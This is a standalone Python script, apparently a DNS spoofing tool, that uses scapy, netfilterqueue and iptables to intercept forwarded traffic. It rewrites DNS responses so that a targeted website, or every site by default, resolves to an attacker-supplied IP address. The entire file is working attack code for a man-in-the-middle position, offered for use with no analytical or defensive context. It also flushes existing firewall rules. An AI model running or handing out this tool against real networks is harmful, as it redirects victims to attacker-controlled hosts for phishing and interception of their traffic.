#!/usr/bin/python
from scapy.all import *
import netfilterqueue, os, argparse

parser = argparse.ArgumentParser(description='- DNS Spoofer.', usage='python dnsSpoofer.py -t <website> -a <attacker-ip>')
parser.add_argument('-t', '--target-host', dest='target', metavar='', help='Specify a website to spoof')
parser.add_argument('-a', '--attacker-ip', dest='attacker', required=True, metavar='', help='Specify attacker ip')
args = parser.parse_args()
if args.target:
    website_to_spoof = args.target # All sites by default
else:
    website_to_spoof = ''

def pre():
    os.system('iptables --flush')
    os.system('iptables -I FORWARD -j NFQUEUE --queue-num 0')
    # os.system('iptables --flush')
    # os.system('iptables -I OUTPUT -j NFQUEUE --queue-num 0')
    # os.system('iptables -I INPUT -j NFQUEUE --queue-num 0')


def spoof(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        website = scapy_packet[DNSQR].qname
        if website_to_spoof in website:
            dns_response = DNSRR(rrname=website, rdata=args.attacker)
            scapy_packet[DNS].an = dns_response
            scapy_packet[DNS].ancount = 1
            del scapy_packet[IP].len
            del scapy_packet[IP].chksum
            del scapy_packet[UDP].len
            del scapy_packet[UDP].chksum
            packet.set_payload(str(scapy_packet))
    packet.accept()

pre()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, spoof)
try:
    print('DNS Spoofing Started...\n')
    queue.run()
except KeyboardInterrupt:
    os.system('iptables --flush')
